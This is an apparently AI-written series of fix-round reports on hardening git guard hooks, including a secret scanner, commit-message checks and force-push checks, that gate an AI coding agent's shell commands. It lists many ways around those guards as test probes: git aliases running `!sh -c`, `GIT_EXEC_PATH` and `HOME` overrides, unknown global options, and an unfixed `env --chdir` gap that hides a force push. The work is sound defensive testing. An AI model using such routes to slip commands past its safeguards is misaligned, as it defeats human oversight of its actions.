- **G6 on a commit:** `diff --cached` and `diff --cached --name-only`. It also reads the unstaged diff when `-a` or pathspecs are given.
- **G6 on a push:**
  - `rev-parse` per source;
  - `git remote`;
  - three `git log` runs over the range: patch, names, messages.
  
  One run, `git log -p -m --format='kern-msg %h%n%B'`, could serve all three, with names read from the `diff --git` headers. That saves two git runs per push. Not done here.
- **Suite time.** The controller measured g01-git.bats going from 36 s to 94 s. Most of its calls are pushes, so G6's push scan runs on each. g05-g06-commit.bats is about 280 hook calls, because every probe runs in both modes.

---

# Fix round 2: G6 hardening (I-1 to I-4, M8 to M14), G5 minors, git aliases, suite time

Status: DONE_WITH_CONCERNS. Every round-2 ruling is applied, in two commits. The concerns are the commit-1 subject length and two residuals, listed below.

Commits:
- `ea2441e M1: G6 cannot be hidden or steered by repo config and scans pushes in bounded time`. The subject is the one the controller gave. It is **82 characters, over the 72-character limit** in the standing rules. The commit is local and unpushed, so an amend is cheap if wanted.
- `65f1766 M1: G5 reads attribution variants and wide adds; git aliases ask` (64 characters)

## Commit 1: G6 (`hooks/guards/g06-secrets.sh`, plus one call in `g02-pr.sh` and one in `g05-commit.sh`)

- **I-1: attributes, `diff.relative`, invalid UTF-8.**
  - Every patch is read with `--text --no-relative`, along with `--no-color --no-ext-diff --no-textconv --src-prefix=a/ --dst-prefix=b/`.
  - Every grep, sed and cut over scan lines runs as `LC_ALL=C` (`grep -a` for the greps).
  - The `cut` is included because BSD `cut` dropped a line holding `\377` under the UTF-8 locale. That was the last failure of the invalid UTF-8 pin.
- **I-2: repo-configured programs.**
  - `_g06_git` runs `git --no-replace-objects -c color.ui=never -c core.fsmonitor=false -c core.quotePath=false -c log.showRoot=true`.
  - The check-ignore in `_gh_file_ok` (g02-pr.sh) and G5's `_g05_log` and `_g05_wide` rev-parse take `-c core.fsmonitor=false`.
  - The push walk passes `--no-show-signature`.
  - G6 no longer reads the worktree. `-a`, `-i`, `-o`, `-p`, `--interactive`, `--pathspec-from-file` and pathspecs vote ask, with deny under autopilot: "kern scans only staged content; git commit <x> commits worktree content it does not read".
  - Measured beforehand on git 2.54: of the guards' git reads, only a worktree `git diff` runs `core.fsmonitor`, and only a `git log` without `--no-show-signature` runs `gpg.program`. The pin covers both: a pathspec commit, an `-a` commit, and a push of a commit carrying a `gpgsig` header with `log.showSignature` set. The marker script never runs.
- **I-3: bounded push walk.**
  - `_g06_walk` runs `with_timeout 8 _g06_git ... | _g06_parse | _g06_keep` and appends the walk's exit code (`PIPESTATUS[0]`).
  - The patch is never held in a variable. Only file names and the lines that hit a rule reach the shell.
  - A nonzero exit asks: "secret scan did not finish in 8 s (exit N); check the change for secrets yourself".
  - A target that `git remote` lists, with tracking refs, is walked as `<srcs> --not --remotes=<target>`. Any other target (a new remote, a URL) is walked as `--not --remotes`, then asks (deny under autopilot): "history already on another remote was not rescanned for <target>". The ask fires only when some remote-tracking ref exists. With none at all, the walk already covered the whole history and nothing was skipped. Test "with no tracking refs anywhere the whole history is scanned and nothing asks" pins this.
  - Overrun test: a fake `git` on PATH runs `exec sleep 5` for `log -p`. `KERN_SCAN_SECS=1`, honoured only under bats as `KERN_GUARDS` is. Result: ask, and deny under autopilot.
- **I-4: merges.**
  - The walk uses `log -p --cc`.
  - `_g06_parse` reads the combined-diff column count from the hunk header (number of `@` minus one). It counts a line only when every column is `+`, and drops lines with a `-` in any column from the line count.
  - Pinned both ways: a clean merge of main that carries a key and a `.db` already on origin gets no vote, and the evil merge still denies.
- **M8: never_commit names.**
  - Names come from the same walk with `core.quotePath=false`.
  - The staged diff takes `--diff-filter=d`.
  - The push walk cannot: in `git log`, `--diff-filter` filters commits. An empty commit and its message disappeared, which made the pushed-message test fail. Instead `_g06_parse` drops a name whose header says `deleted file mode`.
  - Names come from `diff --git a/X b/X` (equal halves, so an empty new file counts), `diff --cc X`, and `rename to` / `copy to`.
  - Pinned: `git rm --cached .env` then commit, and that commit pushed, get no vote; a staged `dät.db` is denied.
- **M9: api-key rule.** It is now `[^A-Za-z0-9_]sk-...`. Scan lines are `<label>\t <text>`, and every rule is matched as `^[^\t]*\t.*(<rule>)`, so only the text field is read. The text starts with a space, so a key at the start of a line still hits. Pinned: `task-...` and a file named `sk-....txt` get no vote; `sk-...` at the start of a line and after `=` deny.
- **M11: could not scan.** After cd, pushd or popd, `--git-dir`, `--work-tree`, `GIT_DIR=`, `GIT_WORK_TREE=` or `GIT_INDEX_FILE=`, including in an earlier record such as `export GIT_DIR=...;`, G6 asks "could not scan: ..." (deny under autopilot).
- **M12: matching pushes.** `push origin :` scans `--branches`, and so does a push with no refspec under `push.default=matching` or with `remote.<target>.push` set.
- **M14: message marker.** The push walk prints `%x1e%h%n%B%x1f` per commit. `\036` starts a message and `\037` ends it, so a message line such as `diff --git` or `+++ b/f` stays message text. Pinned.
- **Two additions not in the rulings, each pinned:**
  - `--no-replace-objects`: a `git replace` of an unpushed key commit hid it from `git log`.
  - `-c log.showRoot=true`: `log.showRoot=false` hid a root commit's content.
  
  Both are repo state that changes what G6 reads but not what the push sends.

## Commit 2: G5 and aliases (`g05-commit.sh`, `g01-git.sh` for aliases only, `g06-secrets.sh` for aliases only)

- **M5: attribution.** Added `(co-authored-by|assisted-by|generated-by)[[:space:]]*[:=].*(claude|anthropic)` (case-insensitive) beside the existing patterns.
- **M6:** a test asserts deny and "attribution" for `--trailer 'Co-authored-by: Claude ...'` and `--trailer 'Assisted-by=Claude'`, interactive, under the default policy.
- **M7: wide adds.**
  - `_g05_add RECORD` treats a record `_gh_literal` rejects as wide.
  - `_g05_wide` finds the worktree root with `git -C <dir> rev-parse --show-prefix` being empty, so the root path spelled in another case is wide.
  - Pinned: `git add {.,src}`, `.{,}`, `` `pwd` `` and `src/{a,b}.ts`, plus the upper-cased repo path. That test skips on a case-sensitive file system.
- **M13: ticket id.** The id must be followed by a non-alphanumeric character or the end, checked with `index` in awk, so no regex is built from the id. `CDS-24650:` and `CDS-2465a` are denied on branch `CDS-2465/...`; `[CDS-2465]` and a trailing `CDS-2465` pass.
- **Aliases.** `_g01_alias_check GUARD DIR SUB CFG RECORD` lives in `g01-git.sh` and is called from G1 (`_g01_git_rec`), G5 and G6. `_g05_split` now also collects `-c` values in `_G05_CFG`.
  - The expansion comes from the record's last `-c alias.<sub>=`, with the key in any case, else `git config --get alias.<sub>`.
  - It asks (deny under autopilot) when the first non-option word of the expansion is a guarded subcommand (push, commit, merge, rebase, reset, checkout, switch, stash, clean, branch, add, pull, worktree), or when the expansion starts with `!`.
  - An alias of an alias is followed up to five deep.
  - A record that sets `GIT_CONFIG_*` or `--config-env` counts as `!`, since the hook cannot read that config.
  - Guarded subcommands and common builtins are never looked up: git runs a builtin even when an alias has its name.
  - `-c alias.*` already made a record unproven, because G5's and G1's proofs reject any `-c`.
  - Pinned for each of G1, G5 and G6: `git -c alias.zz=commit zz`, a configured `ci = commit`, `x = !sh -c ...`, `pu = push origin HEAD`, a chained `c2 = ci`, `-c alias.zz=push`, and a `GIT_CONFIG_*` alias all ask; `st = status` gets no vote; under autopilot, deny.
- **M15: suite time.** `never_allowed` and `allowed` run the policy-auto pass on the first two commands of each list. That is about 67 fewer hook calls. The file went from 66 s to 57 s, with 53 tests either way, on the same machine minutes apart.

## Tests changed to match the rulings

- "a commit of paths, -i, -o, -p or -a in any spelling asks: kern scans only staged content" replaces the round-1 test that expected a deny naming `k.txt:2 private-key` (I-2: G6 no longer reads the worktree).
- "a push scans what the target remote lacks" now expects ask, and deny under autopilot, with "history already on another remote was not rescanned for public" for a remote with no tracking refs (I-3). After `public` gets a tracking ref, the same push denies on `s1.txt:1 private-key`.
- The brief's 11 tests are unchanged.

## TDD evidence

- **Commit 1, RED** (`-f G6`): 10 new or changed tests failed on their probes:
  - `want ask, got deny` for the pathspec commit and the public push;
  - `want deny, got none` for `-diff`, replace refs and `push origin :`;
  - the marker file existed;
  - `want ask, got none` for the overrun and for `cd sub && git commit`;
  - `want none, got deny` for the clean merge, `git rm --cached .env` and `task-...`.
  
  The "message line that looks like a diff" and "no tracking refs anywhere" tests passed before the rewrite; they pin what the new single-walk parser must keep.
- **Commit 1, GREEN:** all 29 G6 tests pass. The first GREEN run failed twice:
  - `--diff-filter=d` in `git log` dropped the empty commit carrying a token in its message;
  - BSD `cut` dropped the `\377` line.
  
  Both fixes are described above. Before committing, `g05-g06-commit.bats` and `g02-g04-gh.bats` gave `1..79`, all `ok`, and shellcheck was clean.
- **Commit 2, RED:** 5 new tests failed:
  - `want deny, got ask` for `Assisted-by: Claude`;
  - `want deny, got allow` for `CDS-24650: x`;
  - `want ask, got none` for `git add {.,src}`, for the upper-cased root, and for `git -c alias.zz=commit zz`.
- **Commit 2, GREEN:** 5 of 5. Then the whole `g05-g06-commit.bats` gave `1..53`, all `ok`, and `g01-git.bats` gave `1..48`, all `ok`. Shellcheck is clean, with and without `-x`, on g01, g02, g05 and g06.
- **Whole suite after both commits:** `tests/run-bats tests/hooks/*.bats tests/scripts/*.bats` gave `1..285`, 285 `ok`, exit 0, in 195 s. `node --test tests/*.test.mjs`: 46 pass, 0 fail.

## Timings

Run on the committed tree (`65f1766`), all guards unless noted. A bats suite was running at the same time, so absolute numbers carry that load.

| Case | Time | Decision |
|---|---|---|
| `git push -u newr CDS-1/work`: 3,000-commit history already on `origin`, one new commit, `newr` a new remote with no tracking refs (3 runs) | 0.28 to 0.34 s | ask: G1 `push CDS-1/work`; G6 `history already on another remote was not rescanned for newr` |
| Same push, no remote-tracking refs at all, so the walk covers all 3,001 commits (20 lines each) (2 runs) | 0.69 to 0.70 s | ask from G1 only (no hit, nothing skipped) |
| `ls` through the dispatcher, all guards (30 calls, 2 rounds) | 130 ms per call | none |
| `ls`, no guard / G5 only / G6 only | 57 / 67 / 67 ms per call | none |

- **History size.** The full 3,001-commit walk finishes in about a tenth of the 8 s bound.
- **Generated repo.** The repo was generated with `git fast-import`. Its 3,000 commits each rewrite one of 200 files with 20 lines.
- **G5 and G6 on `ls`.** Each costs about 10 ms. Neither runs git for it, as in round 1: `_g05_split` stops at the first word, and the alias check runs only after a git record is read.

## Residuals

- **G1's lease-ownership `git log`** (`_g01_own`) runs without `--no-show-signature`. A force-with-lease push in a repo with `log.showSignature` and `gpg.program` set runs that program. I did not change it: this round allows g01 changes for aliases only. The fix is one flag.
- **Alias lookups cost git calls.** A git subcommand that is neither guarded nor in the builtin skip list costs up to three `git config --get` calls, one each in G1, G5 and G6.
- **Builtins missing from `_G01_ALIAS_SKIP`** are looked up. A user alias that shares a builtin's name (git ignores it) would then ask: a false positive, not a miss.

---

# Fix round 3: alias rule, message walk, NUL, encoding, _g01_own and the Minors

Status: DONE_WITH_CONCERNS. Every round-3 ruling is applied, in two commits, and probing found no wrong allow. The concerns are the gitctx `env --chdir` finding and a cosmetic slip in a commit body, both below.

Commits:
- `8b09fb3 M1: git subcommands outside git's own list ask; lease log skips gpg` (67 characters)
- `f0b8a8f M1: G6 reads messages apart, keeps NULs and asks where it cannot scan` (69 characters). The body shows `\\037` and `\\001` where `\037` and `\001` were meant, an escaping slip. It is cosmetic, so it was left in place, in line with the earlier ruling on history rewrites.

## Commit (a): the git command rule and `_g01_own`

- **Stop rule.** `g01-git.sh` was restored from `68ab15d`; round 2 changed nothing else in it. `_G05_CFG` and both guard-loop alias checks are gone from G5 and G6. `grep -rn '_g01_alias\|_G05_CFG\|_G01_ALIAS' hooks/` finds nothing.
- **`_G01_GIT_CMDS`.** This is `git --list-cmds=builtins,main` from git 2.54.0 (Apple Git-157): 174 commands, the builtins (147) being a subset of main.
  - **Shadowing check.** For every entry I ran `GIT_TRACE=1 git -c alias.<cmd>='!echo KERN-ALIAS-RAN' <cmd> -h`, in a throwaway repo with a temp HOME, stdin from `/dev/null` and a 5 s alarm. Exactly two entries ran the alias: `pack-redundant` and `whatchanged`, git's `--list-cmds=deprecated`. Both are dropped. That leaves 172.
  - **Check on the check.** A diff of the baked list against the 172 verified names is empty. `zzz` with an alias was detected (control), and `git COMMIT` fails with "cannot handle COMMIT as a builtin".
- **`_g01_foreign GUARD SUB`.** When SUB is not on the list, it votes ask (deny under autopilot): "git <sub> is not one of git's own commands (an alias or an extension); run the git command it stands for so kern can check it".
  - It is called from G1 (`_g01_git_rec`, before `_g01_git`), and from G5 and G6 after `_g05_split`.
  - No config is read.
  - If G1's file did not load, G5 and G6 ask "kern could not load the list of git's own commands".
- **`_g01_own`.** Both `git log --format=%ae` calls take `--no-show-signature`.
- **Tests.**
  - Every guard, G1, G5 and G6, asks for each of these:
    - `git ci` (alias in the repo, in another repo after `cd`, `--git-dir`, `GIT_DIR=`, `HOME=`, `XDG_CONFIG_HOME=` and `-c include.path=`);
    - `git st` (an alias for status, which also asks now: it replaces the "other aliases pass" ruling);
    - `git lfs pull`;
    - the reviewer's `q1` (`"commit"`), `q3` (`com\mit`) and `q7` (`-c user.name=Zed commit`);
    - `-c alias.zz=commit zz` and `-c alias.zz='"commit"' zz`;
    - `git COMMIT`, `git whatchanged` and `git pack-redundant`.
  - Under autopilot, all three guards together deny `git ci`, `git q1 -am` and `git lfs push`.
  - No regression: `git status`, `git log --oneline -5` and `git stage -- a.txt` get no vote from any guard. A plain `git commit -m 'CDS-2465: x'` is allowed under autopilot. `git -c alias.ci=commit commit` is still denied by G5 (any `-c` makes it unproven).
  - The `_g01_own` pin: a pushed tip carrying a `gpgsig` header, with `log.showSignature=true` and `gpg.program` set to a marker script. `git push --force-with-lease origin <branch>` gets ask with "force-with-lease push", and the marker never runs.
- **RED, then GREEN.** RED had two failures: `want ask, got none for: git ci`, and the marker file existed. Test 2, the no-regression pin, passed both before and after. GREEN: 3 of 3. Then `g01-git.bats` plus `g05-g06-commit.bats` gave `1..103`, all `ok`.

## Commit (b): G6 message walk, NUL, encoding and the Minors

- **Message walk (I-3).** The patch walk is `log --no-show-signature -p --cc ... --format=`, with no message. Messages come from a second walk, `log --no-show-signature -z --format=%h%x00%B`.
  - Both walks run under `with_timeout` and pass through `tr '\000' '\001'`.
  - `_g06_msgs` (awk, `RS=\001`) treats a record of hex digits alone as the commit hash; every other record is message text, scanned line by line.
  - A forged NUL or `\001` in a message can only shift labels: every byte is still scanned, and hex digits alone match no rule.
  - Round 2's `\036`/`\037` handling is removed from `_g06_parse`.
- **NUL (I-5).** Every walk pipes through `LC_ALL=C tr '\000' '\001'` before the awk parser. That covers the staged diff and both push walks.
- **Encoding (I-4).** `_g06_git` adds `-c i18n.logOutputEncoding=UTF-8`.
- **Minor 1: config on a push.** A push asks "could not scan" (deny under autopilot) when any of these holds:
  - the record carries `-c` or `--config-env`;
  - an assignment before the command, or an earlier `export`, sets `GIT_CONFIG*`, `HOME` or `XDG_CONFIG_HOME`;
  - the target remote has `remote.<r>.mirror` true.
  
  The env and HOME forms go beyond the ruling. They are the same class, since each steers push config the hook does not read, and each is pinned.
- **Minor 2.** `env -C`/`--chdir` (short options in a cluster, and long-option prefixes) and `sudo -D`/`-R`/`--chdir`/`--chroot` print `@cwd` from `_g05_env`, and G6 then asks "could not scan".
- **Minor 3: assignment words.** `_g05_env RECORD` (in G5) reads `_shell_words` and reports:
  - `NAME` for an assignment word before the command word, after the same wrappers and option values `_cmd_words` skips;
  - `+NAME` when the assignment outlives the record: an `export` or `declare -x` record, or a record that is only assignments.
  
  `_g05_split` fills `_G05_ENV` for every record, so G5 and G6 never match a substring. `_G05_MOVED` now comes from these words, which also removes round 1's substring check in `_g05_split`. Pinned: `git commit -m 'CDS-2465: stop exporting GIT_DIR=.git in ci'` gets no G6 vote and is allowed under autopilot; `echo GIT_INDEX_FILE=x; git commit` gets no vote; `GIT_DIR=.git; git push` and `sudo GIT_DIR=.git git commit` are denied under autopilot.
- **Minor 4: gitleaks.** gitleaks runs as `with_timeout <secs> _g06_leaks`, which wraps the git read and gitleaks together. Exit 1 denies; 124 or more (stopped by the timeout) asks "secret scan did not finish". Pinned with a fake gitleaks that sleeps, and one that exits 1.
- **Minor 5.** A test pins the autopilot deny on "could not scan" for each `env -C`/`cd`/`GIT_INDEX_FILE` shape.
- **Time budget (supports "both walks under with_timeout").** Each walk is capped at 8 s, and every walk plus gitleaks in one call share 14 s (`_g06_secs`), so a push stays inside the 20 s hook timeout. A spent budget counts as "did not finish". Under bats, `KERN_SCAN_SECS` sets the cap, and three times it the budget.
- **RED, then GREEN.** RED: all 8 new tests failed on their probes:
  - `want deny, got none` for the forged message, the NUL blob and UTF-16;
  - `want ask, got none` for `-c push.default=matching push`, `env -C sub`, the gitleaks overrun and the message-walk overrun;
  - `want none, got ask` for the `GIT_DIR=` message.
  
  GREEN: 7 of 8 at first. `env --chd sub git push` stayed `none`, because of the gitctx gap below; the test now uses `--chd=sub`. Then 8 of 8, and `g05-g06-commit.bats` gave `1..63`, all `ok`, in 71 s.

## Probes of the allow paths touched (scratch copy, all guards, autopilot)

- **Controls allowed:**
  - `git commit -m 'CDS-2465: x'`;
  - `git commit -m 'CDS-2465: stop exporting GIT_DIR=.git in ci'`;
  - `git push -u origin <branch>`;
  - `git push --force-with-lease origin <branch>` (with `rebase.push: autopilot`).
- **Denied:**
  - aliases: `git ci`, `git pu` (`push origin HEAD`), `git p2` (`"push"`);
  - extensions and exec-path: `git lfs push`, `GIT_EXEC_PATH=/tmp/x git commit|push`, `git --exec-path=/tmp/x commit|push`;
  - wrong case: `git COMMIT`, `git Push`;
  - assignments: `GIT_DIR=.git git commit`, `export GIT_DIR=.git; git commit`, `GIT_INDEX_FILE=/tmp/i git commit`;
  - env: `env -C sub git commit`, `env --chdir=sub git push`;
  - config: `git -c push.default=matching push`, `HOME=/tmp git push`, `export HOME=/tmp; git push`.
- **Wrong allows found: none.**

## Finding outside this round: env's long --chdir hides a git command from every guard

`_cmd_words` (gitctx.sh, `cw_opt["env"] = " -C -P -S -u "`) does not know that GNU env's `--chdir` and its prefixes take a separate value. For `env --chdir sub git push --force origin main` and `env --chd sub git push ...` it returns `sub git push --force origin main`. No guard sees a git record, so G1 never sees the force push. The final decision is `none` (Claude Code's normal permission flow), not an allow.

The attached form `--chdir=sub` and `-C sub` parse correctly, and both are pinned. Fix proposal: add `--chdir`, `--split-string`, `--unset` and `--argv0` to `cw_opt["env"]`, and read long-option prefixes of those names. I did not change it: gitctx changes are out of this round's scope.

## Suite and timing

- `tests/run-bats tests/hooks/*.bats tests/scripts/*.bats` on `f0b8a8f`: `1..295`, 295 `ok`, exit 0, 215 s. The controller's backstop on the same commit also passed, 295 of 295.
- `node --test tests/*.test.mjs`: 46 pass, 0 fail.
- `shellcheck` and `shellcheck -x` on every guard and `hooks/pre-tool-use`: clean.

`ls` through the dispatcher, 30 calls per set, two rounds, on `f0b8a8f`:

| Guards | ms per call |
|---|---|
| all | 127 to 140 |
| none | 55 to 56 |
| G1 only | 65 |
| G5 only | 66 |
| G6 only | 65 to 66 |

G1, G5 and G6 each add about 10 ms to `ls`, and none of them runs git for it. The alias rule is a string match against a static list, with no git call.

---

# Fix round 4: re-review-3 Minors 1 to 3

Status: DONE. All three Minors are fixed and pinned. Fix round 5 later replaced Minor 1's open `-*` rule; see the next section.

Commit: `093ca5f M1: git --version passes; wrapped export counts; gitleaks reads messages` (72 characters). Only the four named paths were staged; `docs/plans/2026-10-12-kern-m1-plan.md` was already modified in the tree and stays unstaged. The Important finding (`+=` assignments, upper-case wrappers) is untouched, as directed: it goes to Task 12a.

## Changes

1. **Minor 1, `_g01_foreign` (g01-git.sh).** It returns 1 for an option word (`case "$2" in -*) return 1 ;; esac`). Every global option that leads on to a subcommand is already read by G1's option loop, so only `git --version`, `git -h`, `git --help` and the like reach it. `_g05_split` already returns 1 for these, so G5 and G6 never called `_g01_foreign` with one.
2. **Minor 2, `_g05_env` (g05-commit.sh).**
   - `export`, `declare` and `typeset` are now read at the command word, after any wrappers, instead of only as the record's first word.
   - `builtin` joins the wrapper list.
   - `command export GIT_DIR=/x/.git; git commit ...` gives `+GIT_DIR` again, so G6 says "could not scan".
3. **Minor 3, gitleaks (g06-secrets.sh).**
   - `_g06_leaks` reads the patch walk and then the message walk, kept in `_G06_MSGARGS` (NULs as newlines), into one gitleaks stdin.
   - It still runs under `with_timeout` with the seconds `_g06_secs` leaves in the 14 s budget.
   - A commit sets `_G06_MSGARGS=()`: G6 reads its message itself, as before.

## TDD evidence

- **RED** (`-f "own commands keep|export behind a wrapper|gitleaks reads a pushed"`), 3 of 3 failing on their probes:
  - `want none, got ask for: git --version`;
  - `want ask, got none for: command export GIT_DIR=/x/.git; git commit -m 'CDS-2465: x'`;
  - `grep -q 'message-text-42' gl.in` failed.
- **GREEN:** those 3 plus the existing gitleaks overrun test, 4 of 4. Then `g01-git.bats` plus `g05-g06-commit.bats` gave `1..113`, all `ok`. `shellcheck` and `shellcheck -x` on g01, g05 and g06 are clean.
- **Pins:**
  - The no-regression test now also expects no vote from G1, G5 and G6 for `git --version`, `git -h` and `git --help`, and no vote under autopilot for `git --version`.
  - "an export behind a wrapper" covers `command export GIT_DIR=`, `builtin export GIT_INDEX_FILE=`, `command declare -x GIT_DIR=` and `builtin export HOME=/tmp; git push`.
  - A fake gitleaks that records its stdin sees both `patch-text-17` (the patch) and `message-text-42` (the commit body) on a push.

## Suite

- **My full run on `093ca5f`, stopped early.** I stopped it when round 5 began, because round 5 edits g01 and a run spanning the edit would mix two versions. Tests 1 to 127 were `ok`. Test 128 failed in setup (`make_repo`, its `git push`) because the kill landed there; that is an artifact of stopping, not a guard failure.
- **Full suite:** covered by the controller's backstop run.
- **Before the commit:** `g01-git.bats` plus `g05-g06-commit.bats` gave `1..113`, all `ok`, and shellcheck was clean.

---

# Fix round 5: a closed option set in `_g01_foreign`

Status: DONE.

Commit: `2b7b5de M1: only options that end git pass the foreign check; others ask` (64 characters). It stages only `hooks/guards/g01-git.sh` and `tests/hooks/g05-g06-commit.bats`; `docs/plans/2026-10-12-kern-m1-plan.md` stays unstaged.

## Change

`_g01_foreign` (g01-git.sh) no longer passes every `-*` word. It returns 1 only for the options that end git without running a subcommand: `-v`, `--version`, `-h`, `--help`, `--exec-path`, `--html-path`, `--man-path`, `--info-path` and `--list-cmds=*`. Any other option word that reaches it asks, and is denied under autopilot, with the foreign reason. A word reaches it only when G1's global-option loop does not know it, as with `--shallow-file`.

No parser-table entry was added. The comment now says that unknown options such as `--shallow-file`, which takes a value and hides the command after it, ask.

## Tests

- **No regression.** G1, G5 and G6 each give no vote for `git --version`, `-h`, `--help`, `--exec-path`, `-v` and `--list-cmds=builtins`. Under autopilot, all three give no vote for `git --version`.
- **New test** "a global option G1 does not know asks, so it cannot hide the command after it":
  - G1 asks for `git --foo ci`, with the foreign reason.
  - Under autopilot, `git --shallow-file status push --force origin main` is denied (G1, G5, G6), and `git --foo ci` and `git --shallow-file x commit -m ...` are denied (G1).
  - `git --foo ci` is pinned with G1 alone: on `093ca5f` G5 and G6 already deny it, because they skip the option and see `ci`.
- **Each new deny fails on `093ca5f`.** I ran each command through the dispatcher at `093ca5f` under autopilot with the same guards. All three gave `none`. In bats at `093ca5f` the test failed at its first step (`want ask, got none for: git --foo ci`).
- **GREEN:** `tests/run-bats tests/hooks/g01-git.bats tests/hooks/g05-g06-commit.bats` gave `1..114`, all `ok`. `shellcheck` and `shellcheck -x` on g01-git.sh are clean.
- **Full suite:** not run here; the controller runs it.
